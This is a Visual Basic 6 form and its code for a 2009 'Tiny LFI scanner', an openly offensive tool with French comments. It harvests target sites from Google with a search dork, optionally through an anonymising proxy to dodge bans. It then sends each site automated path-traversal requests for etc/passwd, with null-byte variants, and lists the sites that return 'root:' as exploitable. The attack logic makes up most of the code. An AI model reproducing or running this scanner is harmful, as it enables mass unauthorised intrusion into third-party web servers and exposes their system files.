VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Object = "{831FDD16-0C5C-11D2-A9FC-0000F8754DA1}#2.0#0"; "MSCOMCTL.OCX"
Begin VB.Form LFI 
   BackColor       =   &H00FFFFFF&
   BorderStyle     =   0  'None
   Caption         =   "Tiny LFI scanner 1.0 by Tr00ps & Xylitol"
   ClientHeight    =   8745
   ClientLeft      =   0
   ClientTop       =   -60
   ClientWidth     =   11085
   ForeColor       =   &H0000FFFF&
   LinkTopic       =   "Form2"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   Picture         =   "RFI.frx":0000
   ScaleHeight     =   8745
   ScaleWidth      =   11085
   StartUpPosition =   2  'CenterScreen
   Begin VB.PictureBox pctTransPicture 
      AutoRedraw      =   -1  'True
      AutoSize        =   -1  'True
      BorderStyle     =   0  'None
      Height          =   8745
      Left            =   0
      Picture         =   "RFI.frx":13C912
      ScaleHeight     =   583
      ScaleMode       =   3  'Pixel
      ScaleWidth      =   741
      TabIndex        =   32
      Top             =   0
      Visible         =   0   'False
      Width           =   11115
   End
   Begin VB.PictureBox Picture1 
      BackColor       =   &H00000000&
      Height          =   6855
      Left            =   1080
      ScaleHeight     =   6795
      ScaleWidth      =   9630
      TabIndex        =   33
      Top             =   1680
      Visible         =   0   'False
      Width           =   9690
      Begin VB.Timer ScrollUp 
         Enabled         =   0   'False
         Interval        =   10
         Left            =   1440
         Top             =   4800
      End
      Begin VB.Timer ScrollDown 
         Enabled         =   0   'False
         Interval        =   10
         Left            =   960
         Top             =   4800
      End
      Begin VB.PictureBox Picture2 
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         ForeColor       =   &H00000000&
         Height          =   3400
         Left            =   960
         ScaleHeight     =   3375
         ScaleWidth      =   7815
         TabIndex        =   35
         Top             =   1320
         Width           =   7840
         Begin VB.Shape Shape1 
            BackColor       =   &H000000FF&
            BorderColor     =   &H000000FF&
            Height          =   3375
            Left            =   0
            Top             =   0
            Width           =   7815
         End
         Begin VB.Image Image1 
            Height          =   37830
            Left            =   0
            Picture         =   "RFI.frx":279224
            Top             =   0
            Width           =   7785
         End
      End
      Begin VB.CommandButton Command4 
         Caption         =   "[ OK]"
         Height          =   495
         Left            =   7680
         TabIndex        =   34
         Top             =   5760
         Width           =   975
      End
   End
   Begin VB.TextBox googleban 
      Height          =   285
      Left            =   5400
      TabIndex        =   31
      Text            =   "IP is banned from Google, you need to wait"
      Top             =   9600
      Width           =   1215
   End
   Begin VB.TextBox pbconnec 
      Height          =   285
      Left            =   5400
      TabIndex        =   30
      Text            =   "You have a connection problem"
      Top             =   9240
      Width           =   1215
   End
   Begin VB.TextBox traitement 
      Height          =   285
      Left            =   3600
      TabIndex        =   27
      Text            =   "Processing"
      Top             =   9960
      Visible         =   0   'False
      Width           =   1695
   End
   Begin VB.ComboBox Combo1 
      Height          =   315
      ItemData        =   "RFI.frx":639AD6
      Left            =   2760
      List            =   "RFI.frx":639AF5
      Locked          =   -1  'True
      Style           =   2  'Dropdown List
      TabIndex        =   26
      Top             =   6960
      Width           =   2055
   End
   Begin VB.CommandButton Command3 
      Caption         =   "&Exit"
      Height          =   375
      Left            =   3120
      TabIndex        =   25
      Top             =   8040
      Width           =   1695
   End
   Begin VB.CommandButton Command2 
      Caption         =   "&About"
      Height          =   375
      Left            =   1200
      TabIndex        =   24
      Top             =   8040
      Width           =   1695
   End
   Begin VB.TextBox demar 
      Height          =   315
      Left            =   3600
      TabIndex        =   23
      Text            =   "&Start"
      Top             =   9240
      Visible         =   0   'False
      Width           =   735
   End
   Begin VB.TextBox arreter 
      Height          =   315
      Left            =   4440
      TabIndex        =   22
      Text            =   "&Stop"
      Top             =   9240
      Visible         =   0   'False
      Width           =   855
   End
   Begin VB.TextBox oui 
      Height          =   315
      Left            =   3600
      TabIndex        =   21
      Text            =   "Yes"
      Top             =   9600
      Visible         =   0   'False
      Width           =   735
   End
   Begin VB.TextBox non 
      Height          =   315
      Left            =   4440
      TabIndex        =   20
      Text            =   "No"
      Top             =   9600
      Visible         =   0   'False
      Width           =   855
   End
   Begin VB.ListBox List1 
      Height          =   1035
      Left            =   0
      TabIndex        =   19
      Top             =   9240
      Visible         =   0   'False
      Width           =   3495
   End
   Begin VB.OptionButton Option3 
      BackColor       =   &H00000000&
      Caption         =   "Italian"
      ForeColor       =   &H0000FFFF&
      Height          =   255
      Left            =   6840
      TabIndex        =   18
      Top             =   8160
      Width           =   975
   End
   Begin VB.OptionButton Option2 
      BackColor       =   &H00000000&
      Caption         =   "French"
      ForeColor       =   &H0000FFFF&
      Height          =   255
      Left            =   5880
      TabIndex        =   17
      Top             =   8160
      Width           =   975
   End
   Begin VB.OptionButton Option1 
      BackColor       =   &H00000000&
      Caption         =   "English"
      ForeColor       =   &H0000FFFF&
      Height          =   255
      Left            =   4920
      TabIndex        =   16
      Top             =   8160
      Value           =   -1  'True
      Width           =   975
   End
   Begin VB.TextBox Resultat 
      BackColor       =   &H00000000&
      ForeColor       =   &H00008080&
      Height          =   1455
      Left            =   4920
      MultiLine       =   -1  'True
      ScrollBars      =   3  'Both
      TabIndex        =   15
      Text            =   "RFI.frx":639B2A
      Top             =   6480
      Width           =   5775
   End
   Begin VB.TextBox Text6 
      Height          =   285
      Left            =   2040
      MultiLine       =   -1  'True
      TabIndex        =   10
      Text            =   "RFI.frx":639B35
      Top             =   10080
      Width           =   1455
   End
   Begin VB.CheckBox Check2 
      BackColor       =   &H00000000&
      Caption         =   "Check2"
      ForeColor       =   &H00FFFFFF&
      Height          =   255
      Left            =   4560
      TabIndex        =   9
      Top             =   7680
      Width           =   255
   End
   Begin VB.TextBox BW2T 
      Height          =   285
      Left            =   2040
      MultiLine       =   -1  'True
      TabIndex        =   8
      Text            =   "RFI.frx":639B3B
      Top             =   9720
      Width           =   1455
   End
   Begin VB.TextBox Text2 
      Height          =   255
      Left            =   1680
      TabIndex        =   6
      Text            =   "inurl:""index.php?include_file="""
      Top             =   6480
      Width           =   1815
   End
   Begin VB.CommandButton Command1 
      Caption         =   "&Start"
      Height          =   315
      Left            =   3600
      TabIndex        =   5
      Top             =   6480
      Width           =   1215
   End
   Begin VB.Timer TimerGoogle 
      Enabled         =   0   'False
      Interval        =   5000
      Left            =   1080
      Top             =   9720
   End
   Begin VB.TextBox Text1 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      BorderStyle     =   0  'None
      ForeColor       =   &H00FFFFFF&
      Height          =   195
      Left            =   3000
      Locked          =   -1  'True
      TabIndex        =   4
      Text            =   "0"
      Top             =   7440
      Width           =   615
   End
   Begin VB.CheckBox Check1 
      BackColor       =   &H00000000&
      ForeColor       =   &H00FFFFFF&
      Height          =   255
      Left            =   4560
      TabIndex        =   3
      Top             =   7440
      Width           =   255
   End
   Begin VB.TextBox Text3 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      BorderStyle     =   0  'None
      ForeColor       =   &H00FFFFFF&
      Height          =   195
      Left            =   3000
      Locked          =   -1  'True
      TabIndex        =   2
      Text            =   "0"
      Top             =   7680
      Width           =   615
   End
   Begin VB.Timer TimerAttaque 
      Enabled         =   0   'False
      Interval        =   1000
      Left            =   1560
      Top             =   9720
   End
   Begin VB.TextBox Text8 
      Height          =   285
      Left            =   2040
      MultiLine       =   -1  'True
      TabIndex        =   1
      Text            =   "RFI.frx":639B41
      Top             =   10440
      Width           =   1455
   End
   Begin MSComctlLib.ListView ListeSite 
      Height          =   4695
      Left            =   1020
      TabIndex        =   0
      Top             =   1680
      Width           =   9705
      _ExtentX        =   17119
      _ExtentY        =   8281
      LabelWrap       =   -1  'True
      HideSelection   =   0   'False
      AllowReorder    =   -1  'True
      _Version        =   393217
      ForeColor       =   16777215
      BackColor       =   0
      Appearance      =   0
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      NumItems        =   0
   End
   Begin MSWinsockLib.Winsock WinsockAttaque 
      Left            =   600
      Top             =   9720
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock WinsockGoogle 
      Left            =   120
      Top             =   9720
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.Image Image2 
      Height          =   285
      Left            =   10050
      Picture         =   "RFI.frx":639B47
      Top             =   1200
      Width           =   660
   End
   Begin VB.Image Image3 
      Height          =   285
      Left            =   10050
      Picture         =   "RFI.frx":63A555
      Top             =   1200
      Visible         =   0   'False
      Width           =   660
   End
   Begin VB.Image Image4 
      Height          =   285
      Left            =   10050
      Picture         =   "RFI.frx":63AF63
      Top             =   1200
      Visible         =   0   'False
      Width           =   660
   End
   Begin VB.Image Image5 
      Height          =   285
      Left            =   9270
      Picture         =   "RFI.frx":63B971
      Top             =   1200
      Width           =   405
   End
   Begin VB.Image Image6 
      Height          =   285
      Left            =   9270
      Picture         =   "RFI.frx":63BFEF
      Top             =   1200
      Visible         =   0   'False
      Width           =   405
   End
   Begin VB.Image Image7 
      Height          =   285
      Left            =   9270
      Picture         =   "RFI.frx":63C66D
      Top             =   1200
      Visible         =   0   'False
      Width           =   405
   End
   Begin VB.Label Label2 
      Alignment       =   1  'Right Justify
      AutoSize        =   -1  'True
      BackStyle       =   0  'Transparent
      Caption         =   "Xylitol And Tr00ps - 2oo9"
      Enabled         =   0   'False
      Height          =   195
      Left            =   8925
      TabIndex        =   29
      Top             =   8280
      Width           =   1770
   End
   Begin VB.Label Label1 
      Alignment       =   1  'Right Justify
      AutoSize        =   -1  'True
      BackStyle       =   0  'Transparent
      Caption         =   "http://www.google."
      ForeColor       =   &H00FFFFFF&
      Height          =   195
      Left            =   1080
      TabIndex        =   28
      Top             =   7080
      Width           =   1635
   End
   Begin VB.Label Label4 
      AutoSize        =   -1  'True
      BackColor       =   &H00000000&
      BackStyle       =   0  'Transparent
      Caption         =   "Dork:"
      ForeColor       =   &H00FFFFFF&
      Height          =   315
      Left            =   1200
      TabIndex        =   14
      Top             =   6480
      Width           =   390
   End
   Begin VB.Label grablink 
      Alignment       =   1  'Right Justify
      AutoSize        =   -1  'True
      BackColor       =   &H00000000&
      BackStyle       =   0  'Transparent
      Caption         =   "Grabbed links:"
      ForeColor       =   &H00FFFFFF&
      Height          =   195
      Left            =   1080
      TabIndex        =   13
      Top             =   7680
      Width           =   1815
   End
   Begin VB.Label GOOGLEPAGE 
      Alignment       =   1  'Right Justify
      AutoSize        =   -1  'True
      BackColor       =   &H00000000&
      BackStyle       =   0  'Transparent
      Caption         =   "Google page visited:"
      ForeColor       =   &H00FFFFFF&
      Height          =   195
      Left            =   1080
      TabIndex        =   12
      Top             =   7440
      Width           =   1815
   End
   Begin VB.Label Proxy 
      Alignment       =   1  'Right Justify
      AutoSize        =   -1  'True
      BackColor       =   &H00000000&
      BackStyle       =   0  'Transparent
      Caption         =   "Proxy:"
      ForeColor       =   &H00FFFFFF&
      Height          =   195
      Left            =   3600
      TabIndex        =   11
      Top             =   7680
      Width           =   795
   End
   Begin VB.Label votreIP 
      Alignment       =   1  'Right Justify
      AutoSize        =   -1  'True
      BackColor       =   &H00000000&
      BackStyle       =   0  'Transparent
      Caption         =   "Your IP:"
      ForeColor       =   &H00FFFFFF&
      Height          =   195
      Left            =   3600
      TabIndex        =   7
      Top             =   7440
      Width           =   810
   End
End
Attribute VB_Name = "LFI"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'Codeurs: Tr00ps | Xylitol
'Sites  : www.Agents-Codeurz.com | Xylilabs.free.fr
'Greetz : ...

Private a As String ' Compteur pour connaitre si on doit lancer la requête principal et la requête secondaire
Private b As String ' Compteur pour les pages secondaires de google
Private c As String ' Lancement de TimerGoogle au premier site recupéré de google
Private d As String ' Compteur d arborescence pour les attaques
Private e As String ' Compteur d'ajout des "../"
Private g As String ' Compteur contant les mauvaises réponse de Goolge

Private Host As String
Private Buffer As String ' Buffer transportant le lien jusqu a l'ecriture dans la Listview
Private BufferBannie As String ' Buffer servant a savoir si google nous a bannie
Private BufferAttaque As String
Private BufferTest As String ' buffer de test contenant le buffer qui contient le lien recupéré et qui vas subir tout une serie de test pour savoir si le lien est exploitable
Private BufferByteNull As String ' Buffer contenant le Byte Null
Private BufferReponseAttaque As String ' Buffer contenant la reponse de l'attaque


Private Site1 As Long ' Buffer comptant le nombre de liens trouvé
Public Site2 As Long ' Buffer gerant le site a attaquer
' Ce code peut paraître hardcore mais j'avais pas envie d'utilisé les OptionBoutons :]
Private Sub Check1_Click()
Check2.Value = 0
End Sub
Private Sub Check2_Click()
Check1.Value = 0
End Sub


Private Sub Check1_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
Check1.Value = 1
End Sub

Private Sub Check2_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
Check2.Value = 1
End Sub


Private Sub Stope()
    TimerGoogle.Enabled = False
        Option1.Enabled = True
    Option2.Enabled = True
    Option3.Enabled = True
        Check1.Enabled = True
    Check2.Enabled = True
    Combo1.Locked = False
    WinsockGoogle.Close
End Sub


Private Sub Command1_Click()
If Command1.Caption = "" & arreter.Text & "" Then ' En fonction du langage
    TimerGoogle.Enabled = False
    TimerAttaque.Enabled = False
        Option1.Enabled = True
    Option2.Enabled = True
    Option3.Enabled = True
        Check1.Enabled = True
    Check2.Enabled = True
    Combo1.Locked = False
    WinsockGoogle.Close
    WinsockAttaque.Close
    Command1.Caption = "" & demar.Text & "" ' En fonction du langage
Else
    BufferAttaque = ""
    ListeSite.ListItems.Clear ' On nettoie la ListView
    Text3.Text = 0
    Site1 = 0
    Site2 = 1
    a = 0
    b = 1
    d = 0
    e = 0
    f = 0
    g = 0
    Command1.Caption = "" & arreter.Text & ""
    TimerGoogle.Enabled = True
    Check1.Enabled = False
    Check2.Enabled = False
    Option1.Enabled = False
    Option2.Enabled = False
    Option3.Enabled = False
    Combo1.Locked = True
        With ListeSite.ListItems
        .Add 1, , ""
    End With
    With ListeSite.ListItems
    .Item(1).SubItems(1) = ""
    End With
End If
End Sub

Private Sub Command2_Click()
Picture1.Visible = True
ScrollDown.Enabled = True
If uFMOD_PlaySong(1, 0, XM_RESOURCE) <> 0 Then ' On lance la chiptune
End If
End Sub

Private Sub Command3_Click()
Unload Me ' On décharge la feuille
End Sub

Private Sub Command4_Click()
Picture1.Visible = False
Image1.Top = 0 ' On revient a la normale
ScrollUp.Enabled = False
ScrollDown.Enabled = False
uFMOD_PlaySong 0, 0, 0 ' Stop la chiptune
End Sub

Private Sub Form_Load()
Picture1.Left = 1040
Picture1.Top = 1680
GenerateTransForm Me, pctTransPicture, RGB(255, 0, 255)
With ListeSite
    .View = lvwReport
    Call .ColumnHeaders.Clear
    Call .ColumnHeaders.Add(, , "") ' Nom de la colonne 1
    Call .ColumnHeaders.Add(, , "Site") ' Nom de la colonne 2
    Call .ColumnHeaders.Add(, , "Attack") ' Nom de la colonne 3
    Call .ColumnHeaders.Add(, , "Vulnerable") ' Nom de la colonne 4
End With
With ListeSite.ColumnHeaders
    .Item(1).Width = 0    ' Largeur de la colonne 1
    .Item(2).Width = 4350 ' Largeur de la colonne 2
    .Item(3).Width = 3600 ' Largeur de la colonne 3
    .Item(4).Width = 1500 ' Largeur de la colonne 4
End With
Resultat.Text = ""
Text3.Text = 0 ' Mise a 0 du nombre de Page Google visité
Site1 = 0 ' Cette variable gere le nombre de lien trouvé
Site2 = 0 ' Cette variable gere le site a scanner
a = 0 ' Cette variable sert a savoir si l'on doit envoyer la variable pour la page principal ou les pages seconbdaire de Google
b = 1 ' Cette variable gere le compteur des pages secondaire de Google
Command1.Caption = "&Start"
Site1 = ListeSite.ListItems.Count + 1
Check1.Value = 1
Combo1.ListIndex = 0
Combo1.Locked = False
End Sub



Private Sub Form_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Image7.Visible = False
Image6.Visible = False
Image3.Visible = False
Image4.Visible = False
Image2.Visible = True
Image5.Visible = True
   On Error GoTo Form_MouseMove_Error
    If Button = vbLeftButton Then
        ReleaseCapture
        SendMessage Me.hWnd, WM_NCLBUTTONDOWN, HTCAPTION, 0&
    End If
    On Error GoTo 0
    Exit Sub
Form_MouseMove_Error:
    MsgBox "Error " & Err.Number & " (" & Err.Description & ") in procedure Form_MouseMove of Feuille form1"

End Sub


'############ DÈBUT DES LANGAGES ############
Private Sub Option1_Click() ' English language
ListeSite.ColumnHeaders.Item(2).Text = "Site"
ListeSite.ColumnHeaders.Item(3).Text = "Attack"
ListeSite.ColumnHeaders.Item(4).Text = "Vulnerable"
votreIP.Caption = "Your IP:"
GOOGLEPAGE.Caption = "Google page visited:"
grablink.Caption = "grabbed links:"
traitement.Text = "Processing"
googleban.Text = "IP is banned from Google, you need to wait."
demar.Text = "&Start"
pbconnec.Text = "You have a connection problem."
arreter.Text = "&Stop"
oui.Text = "Yes"
non.Text = "No"
Command1.Caption = demar.Text
Command2.Caption = "&About..."
Command3.Caption = "&Exit"
End Sub

Private Sub Option2_Click() ' French language
ListeSite.ColumnHeaders.Item(2).Text = "Site"
ListeSite.ColumnHeaders.Item(3).Text = "Attaque"
ListeSite.ColumnHeaders.Item(4).Text = "Vulnerable"
votreIP.Caption = "Votre IP:"
traitement.Text = "Traitement"
googleban.Text = "L'IP est bannie de google, vous devez attendre."
GOOGLEPAGE.Caption = "Page Google Visité:"
grablink.Caption = "liens récupérés:"
pbconnec.Text = "Vous avez un problème de connection."
demar.Text = "&Démarrer"
arreter.Text = "&Arrêter"
oui.Text = "Oui"
non.Text = "Non"
Command1.Caption = demar.Text
Command2.Caption = "&A propos de..."
Command3.Caption = "&Quitter"
End Sub

Private Sub Option3_Click() ' Italian language
ListeSite.ColumnHeaders.Item(2).Text = "Site"
ListeSite.ColumnHeaders.Item(3).Text = "Attacca"
ListeSite.ColumnHeaders.Item(4).Text = "Vulnerabile"
traitement.Text = "Attendere"
votreIP.Caption = "Tuo IP:"
grablink.Caption = "Links trovati"
pbconnec.Text = "hai un problema di connessione!"
googleban.Text = "L'IP è bannato da google, attendi perfavore."
GOOGLEPAGE.Caption = "Pagine di Google visitate:"
demar.Text = "&Inizia"
arreter.Text = "&Stop"
oui.Text = "Si"
non.Text = "No"
Command1.Caption = demar.Text
Command2.Caption = "&About..."
Command3.Caption = "&Esci"
End Sub
'############ FIN DES LANGAGES ############

Private Sub ScrollDown_Timer()
If Image1.Top = -34440 Then
ScrollDown.Enabled = False
ScrollUp.Enabled = True
Else
Image1.Top = Image1.Top - 10
End If
End Sub

Private Sub ScrollUp_Timer()
If Image1.Top = 0 Then
ScrollDown.Enabled = True
ScrollUp.Enabled = False
Else
Image1.Top = Image1.Top + 10
End If
End Sub

Private Sub TimerGoogle_Timer()
WinsockGoogle.Close
' Case à cocher pour sélectionner le proxy, en fonction du chois, on se connecte sur le serveur désiré
If Check1.Value = 1 Then
Host = "www.google" & Combo1.Text & "" ' Sélectionne google en host suivit d'un de ses noms de domaines pour différents pays
End If
If Check2.Value = 1 Then
Host = "www.anonymouse.org" ' proxy
End If
WinsockGoogle.Connect Host, 80 'Port 80 = Pour la consultation d'un serveur HTTP par le biais d'un Navigateur web
Text6.Text = ""
End Sub
Private Sub WinsockGoogle_Connect()
Dim RequeteGoogle As String
    
' Fabrication de la requête a envoyer pour la recherche des liens google en fonction de la case coché.

If Check1.Value = 1 Then ' Fabrication de la requête Google
    If a = 0 Then ' fabrication Requette pour page principal
        RequeteGoogle = "GET /search?hl=fr&ie=ISO-8859-1&q=" & Text2.Text & "&btnG=Recherche+Google&meta=&aq=f&oq= HTTP/1.1" & vbCrLf & vbCrLf
        c = 0
        a = a + 1
    Else ' fabrication Requette pour page secondaire
        RequeteGoogle = "GET /search?hl=fr&ie=UTF-8859-1&q=" & Text2.Text & "&start=" & b & "0&sa=N HTTP/1.1" & vbCrLf & vbCrLf
        b = b + 1
    End If
End If
If Check2.Value = 1 Then ' Fabrication de la requête Proxy
    If a = 0 Then ' fabrication Requette pour page secondaire
        RequeteGoogle = "GET /cgi-bin/anon-www.cgi/http://www.google" & Combo1.Text & "/search?hl=fr&ie=ISO-8859-1&q=" & Text2.Text & "&btnG=Recherche+Google&meta=&aq=f&oq= HTTP/1.1" & vbCrLf
        c = 0
        a = a + 1
    Else
        RequeteGoogle = "GET /cgi-bin/anon-www.cgi/http://www.google" & Combo1.Text & "/search?hl=fr&ie=UTF-8&q=" & Text2.Text & "&start=" & b & "0&sa=N HTTP/1.1" & vbCrLf
        b = b + 1
    End If
        RequeteGoogle = RequeteGoogle & "Host: anonymouse.org" & vbCrLf

End If ' Morceau de requette identique au deux sites
        RequeteGoogle = RequeteGoogle & "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.0; fr; rv:1.9.0.5) Gecko/2008120122 Firefox/3.0.5" & vbCrLf
        RequeteGoogle = RequeteGoogle & "Accept: */*" & vbCrLf
        RequeteGoogle = RequeteGoogle & "Accept-Language: fr,fr-fr;q=0.8,en-us;q=0.5,en;q=0.3" & vbCrLf
        RequeteGoogle = RequeteGoogle & "Accept-Encoding: gzip,deflate" & vbCrLf
        RequeteGoogle = RequeteGoogle & "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7" & vbCrLf
        RequeteGoogle = RequeteGoogle & "Keep-Alive: 300" & vbCrLf
        RequeteGoogle = RequeteGoogle & "Connection: keep-alive" & vbCrLf & vbCrLf
' Envoi de de la requête a google ou son proxy
WinsockGoogle.SendData RequeteGoogle
Text8.Text = RequeteGoogle
End Sub
Public Sub WinsockGoogle_DataArrival(ByVal bytesTotal As Long)
On Error Resume Next
Dim row() As String
Dim ni As Long
Buffer = ""
WinsockGoogle.GetData BufferBannie
Buffer = BufferBannie
row = Split(BufferBannie, "vbCrLf")
' Si dans bufferbannie, la page contien "302 Moved" c est que Google a Bannie l'ip de connection
ni = Module1.Extract(row(), "302 Moved", BufferBannie, 0)

If BufferBannie = "" Then
' Dans ma réponse chaque URL se termine par "- ", je vais utiliser se repaire et l'échanger avec retour ligne
Text6.Text = Text6.Text & Buffer
Buffer = Replace(Buffer, "- ", vbCrLf)
extraction Buffer
Text1.Text = b
TimerGoogle.Enabled = False
TimerGoogle.Enabled = True
Else
MsgBox "" & googleban.Text & "", vbExclamation, "Damned" 'On se fait busted par google donc on stop de cherché mais, on continue a scanné les liens chopé
Stope
End If
End Sub
Private Sub WinsockGoogle_Error(ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean) 'Erreur!
MsgBox "Socket error ! & vbcrlf # " & vbCritical & Number & vbCrLf & Description, vbCritical ' Erreur de la part du socket
TimerGoogle.Enabled = False
TimerGoogle.Enabled = True
End Sub
Private Sub extraction(ByRef str As String)
Dim row() As String
Dim ni As Long
' Sachant que l on as deja généré le retour ligne , on vas utlisé "k - </cite>" pour trouver un mot cles qui est prensent en fin de ligne
row = Split(Buffer, "k - </cite>")
ni = Module1.Extract(row(), "<cite>", Buffer, 0)
Buffer = Replace(Buffer, "<b>", "")
Buffer = Replace(Buffer, "</b>", "")
Buffer = Replace(Buffer, " ", "")
Buffer = "@" & Buffer
test
End Sub

Private Sub test()
Dim row() As String
Dim ni As Long
Dim test As String
BufferTest = Buffer
row = Split(BufferTest, "vbCrLf")
ni = Module1.Extract(row(), "=", BufferTest, 0)
' Je verifie si un "=" se trouve dans mon lien sinon , je met un @ a la place de l adresse du site
If BufferTest = "" Then
Buffer = "@"
End If
test2
End Sub
Private Sub test2()
Dim row() As String
Dim ni As Long
Dim test As String
BufferTest = Buffer
row = Split(BufferTest, "vbCrLf")
ni = Module1.Extract(row(), "<", BufferTest, 0)
' Je verifie si du code html se balade encore dans la ligne si oui , je met un @ a la place de l adresse du site
If BufferTest <> "" Then
Buffer = "@"
g = g - 1
End If
injection
End Sub
Private Sub injection()
Dim row() As String
Dim ni As Long
' Je coupe mon lien à chaque fois que je rencontre "="
row = Split(Buffer, "=")
' je recupére chaque lien créer par le biais du repère @ en debut de ligne
ni = Module1.Extract(row(), "@", Buffer, 0)
Buffer = Buffer & "="

' Si rien ne se trouve apres @ j aurais un buffer ne comportant que "="
If Buffer = "=" Then
g = g + 1
    If g = 10 Then
        MsgBox "" & pbconnec.Text & "", vbExclamation, "Error" ' En fonction du langage
        Stope
    Else
        g = 0
    End If
Else
' j'ecrit le nouveau lien dans la listview
    Site1 = Site1 + 1
    With ListeSite.ListItems
        .Add Site1, , ""
    End With
    With ListeSite.ListItems
    .Item(Site1).SubItems(1) = Buffer
    End With
    ' Je déclenche TimerAttaque
    If c = 0 Then
    c = 1
    TimerAttaque.Enabled = True
End If
Text3.Text = Text3.Text + 1
End If


End Sub
Private Sub TimerAttaque_Timer()
If ListeSite.ListItems(Site2).SubItems(1) <> "" Then
' quand ça atteint 10, ca passe au site suivant
    If d = 13 Then
        If ListeSite.ListItems(Site2).SubItems(3) = "" & oui.Text & "" Then
        Site2 = Site2 + 1
        BufferAttaque = ""
        d = 0
        e = 0
     Else
        ListeSite.ListItems(Site2).SubItems(3) = "" & non.Text & ""
        Site2 = Site2 + 1
        BufferAttaque = ""
        d = 0
        e = 0
        End If
    End If
BW2T.Text = ""
If ListeSite.ListItems(Site2).SubItems(1) = "" Then
Else
    ListeSite.ListItems(Site2).SubItems(3) = "" & traitement.Text & ""
    ' Injection de l'attaque
        If e = 1 Then ' Injection du byte null
            BufferByteNull = "%00"
            e = 0
        Else
            BufferByteNull = ""
            e = 1
            BufferAttaque = BufferAttaque & "../"
            d = d + 1
        End If
    ' J incrémente 10 "../" que j ai delimité avec un max de 10
    
        BufferReponseAttaque = ""
    ' Je me sert d une foction ExtractUrl trouvé sur le net pour separé l adresse du site de son arborescence
        Module1.ExtractUrl ListeSite.ListItems(Site2).SubItems(1)
        WinsockAttaque.Close
        WinsockAttaque.Connect Module1.retURL.Host, 80
    End If
End If
End Sub
Private Sub WinsockAttaque_Connect()
Dim RequeteAttaque As String
RequeteAttaque = "GET " & Module1.retURL.URI & BufferAttaque & "etc/passwd" & BufferByteNull & " HTTP/1.1" & vbCrLf
    RequeteAttaque = RequeteAttaque & "Host: " & Module1.retURL.Host & vbCrLf
    RequeteAttaque = RequeteAttaque & "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.0; fr; rv:1.9.0.5) Gecko/2008120122 Firefox/3.0.5" & vbCrLf
    RequeteAttaque = RequeteAttaque & "Accept: */*" & vbCrLf
    RequeteAttaque = RequeteAttaque & "Accept-Language: fr,fr-fr;q=0.8,en-us;q=0.5,en;q=0.3" & vbCrLf
    RequeteAttaque = RequeteAttaque & "Accept-Encoding: gzip,deflate" & vbCrLf
    RequeteAttaque = RequeteAttaque & "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7" & vbCrLf
    RequeteAttaque = RequeteAttaque & "Keep-Alive: 300" & vbCrLf
    RequeteAttaque = RequeteAttaque & "Connection: keep-alive" & vbCrLf & vbCrLf
WinsockAttaque.SendData RequeteAttaque
ListeSite.ListItems(Site2).SubItems(2) = BufferAttaque & "etc/passwd" & BufferByteNull
Text8.Text = RequeteAttaque
End Sub
Public Sub WinsockAttaque_DataArrival(ByVal bytesTotal As Long)
On Error Resume Next
Dim BW2 As String ' Information contenant la reponse de Winbsock2
Dim row() As String
Dim ni As Long
Dim test As String
WinsockAttaque.GetData BW2
Buffer = Replace(BW2, "vbCrLf", "")
BW2T.Text = BW2T.Text & BW2
row = Split(BW2T.Text, "<")
' Si "root:" se trouve dans la page , alors la faille est trouvé , a moin que dans la page se trouve volontairement "root:"
ni = Module1.Extract(row(), "root:", BufferReponseAttaque, 0)
If BufferReponseAttaque <> "" Then
ListeSite.ListItems(Site2).SubItems(3) = "" & oui.Text & ""
WinsockAttaque.Close
' j'ecrit dans le champs de text le lien vulnerable
Resultat.Text = Resultat.Text & ListeSite.ListItems(Site2).SubItems(1) & ListeSite.ListItems(Site2).SubItems(2) & vbCrLf ' Un site et peut être vulnérable on l'ajoute dans une TextBox que l'utilisateur peut copier
BW2T.Text = ""
d = 13
End If
TimerAttaque.Enabled = False
TimerAttaque.Enabled = True
End Sub


'########## Code de merde pour le design "Vista" ##########
Private Sub Image2_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Image4.Visible = True
Image2.Visible = False
End Sub

Private Sub Image4_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
Image3.Visible = True
End Sub

Private Sub Image5_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Image7.Visible = True
Image5.Visible = False
End Sub

Private Sub Image7_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
Image6.Visible = True
End Sub

Private Sub Image7_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
Me.WindowState = 1 ' On réduit la feuille
End Sub

Private Sub Image4_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
Unload Me ' On décharge la feuille
End Sub
'########## Fin du code de merde pour le design "Vista" ##########
